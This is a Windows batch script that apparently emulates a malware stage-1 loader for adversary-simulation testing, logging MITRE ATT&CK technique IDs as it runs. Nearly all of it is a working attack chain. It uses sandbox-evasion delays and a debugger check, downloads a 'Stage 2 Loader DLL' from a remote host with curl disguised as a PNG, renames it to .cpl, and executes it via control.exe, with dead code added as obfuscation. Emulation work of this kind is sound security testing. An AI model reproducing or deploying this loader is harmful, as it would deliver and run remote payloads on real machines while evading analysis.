@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ placeholder assignments (random-named SET variables)
SET a1qw=%APPDATA%\10950\a9759a89
SET b2er=90faa389.txt
SET c3ty=https://10.0.0.49/stage/2/icon.png?10950-7
SET d4ui=BALAM-S2BO
SET e5op=10950
SET f6as=7
SET g7df=%PUBLIC%\\macula-simulations.log
SET h8gh=https://10.0.0.49

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM State machine variable
SET state=0
GOTO dispatch

:dispatch
IF %state%==0 GOTO init
IF %state%==10 GOTO heartbeat
IF %state%==20 GOTO delays2
IF %state%==25 GOTO detection
IF %state%==30 GOTO rename_chdir
IF %state%==40 GOTO execute
IF %state%==99 GOTO END

:dead1
REM Dead code - never reached
SET dummy=1
EXIT

:init
REM Initial delay (10-20s)
timeout /t 15 /nobreak >nul
ping -n 3 127.0.0.1 >nul
SET state=10
GOTO dispatch

:dead2
REM More dead code
SET unused=hidden
GOTO END

:heartbeat
REM Debug log: heartbeat_start
echo [!tsvar!][DEBUG][!d4ui!][!e5op!]: heartbeat_start>> "!g7df!" 2>nul

REM Download Stage 2 Loader DLL via curl
curl -k -s -o "!a1qw!\!b2er!" "!c3ty!"

REM Debug log: heartbeat_complete
echo [!tsvar!][DEBUG][!d4ui!][!e5op!]: heartbeat_complete>> "!g7df!" 2>nul

REM Log T1497: Virtualization/Sandbox Evasion (delays count)
echo [!tsvar!][TTP][!d4ui!][!e5op!]: T1497^|Virtualization/Sandbox Evasion=OK:>> "!g7df!" 2>nul

SET state=20
GOTO dispatch

:dead3
REM Dead branch
IF 1==0 GOTO real3
GOTO END

:delays2
REM Additional delays (5-15s)
timeout /t 8 /nobreak >nul
ping -n 5 127.0.0.1 >nul
for /l %%i in (1,1,7) do timeout /t 1 /nobreak >nul

REM Random delay (10-29s)
SET /A rdelay=%RANDOM% %% 20 + 10
timeout /t !rdelay! /nobreak >nul

SET state=25
GOTO dispatch

:detection
REM Anti-analysis: Debugger check (simulated, always false)
wmic process where "name='devenv.exe'" get name 2>nul | find /i "devenv" >nul
IF !ERRORLEVEL! EQU 0 (
    REM Debugger detected - add sleep but continue
    timeout /t 4 /nobreak >nul
    echo [!tsvar!][DEBUG][!d4ui!][!e5op!]: debugger_detected_sleep>> "!g7df!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!d4ui!][!e5op!]: debugger_not_found>> "!g7df!" 2>nul
)

SET state=30
GOTO dispatch

:dead4
REM Another dead label
SET fake_path=C:\nonexistent
GOTO END

:rename_chdir
REM Change directory to output dir
echo [!tsvar!][DEBUG][!d4ui!][!e5op!]: chdir_start>> "!g7df!" 2>nul
cd /d "!a1qw!" >nul 2>&1
echo [!tsvar!][DEBUG][!d4ui!][!e5op!]: chdir_result=0>> "!g7df!" 2>nul

REM Rename downloaded file to .cpl
FOR %%i IN ("!b2er!") DO SET base_cpl=%%~ni
ren "!a1qw!\!b2er!" "!base_cpl!.cpl"

REM Debug log for rename
echo [!tsvar!][DEBUG][!d4ui!][!e5op!]: rename_complete>> "!g7df!" 2>nul

SET state=40
GOTO dispatch

:fake_exec
REM Dead code mimicking execution
control.exe "C:\windows\system32\fake.cpl"
GOTO END

:execute
REM Debug log: controlexec_start
echo [!tsvar!][DEBUG][!d4ui!][!e5op!]: controlexec_start>> "!g7df!" 2>nul

REM Invoke via control.exe with full absolute path
control.exe "!a1qw!\!base_cpl!.cpl"

REM Log T1218: System Binary Proxy Execution
IF !ERRORLEVEL! EQU 0 (
    echo [!tsvar!][TTP][!d4ui!][!e5op!]: T1218^|System Binary Proxy Execution=OK:>> "!g7df!" 2>nul
) ELSE (
    echo [!tsvar!][TTP][!d4ui!][!e5op!]: T1218^|System Binary Proxy Execution=FAIL:!ERRORLEVEL!>> "!g7df!" 2>nul
)

REM Log T1027: Obfuscated Files or Information
echo [!tsvar!][TTP][!d4ui!][!e5op!]: T1027^|Obfuscated Files or Information=OK:>> "!g7df!" 2>nul

REM Debug log: controlexec_result
echo [!tsvar!][DEBUG][!d4ui!][!e5op!]: controlexec_result=!ERRORLEVEL!>> "!g7df!" 2>nul

SET state=99
GOTO dispatch

:dead5
REM Final dead label
SET end_var=done
GOTO END

:END
REM Script complete
EXIT /B 0